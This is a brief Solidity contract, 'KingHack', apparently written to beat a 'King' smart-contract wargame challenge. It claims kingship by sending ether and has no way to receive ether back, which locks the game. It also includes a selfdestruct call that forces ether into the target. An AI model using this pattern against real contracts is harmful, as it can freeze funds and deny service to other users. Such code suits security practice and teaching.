
pragma solidity ^0.8.0;

contract KingHack {

    function becomeKing(address payable _kingGameAddress) external payable {
        _kingGameAddress.transfer(msg.value);
    }

    function destruct(address payable _kingGameAddress) external {
        selfdestruct(_kingGameAddress);
    }
}
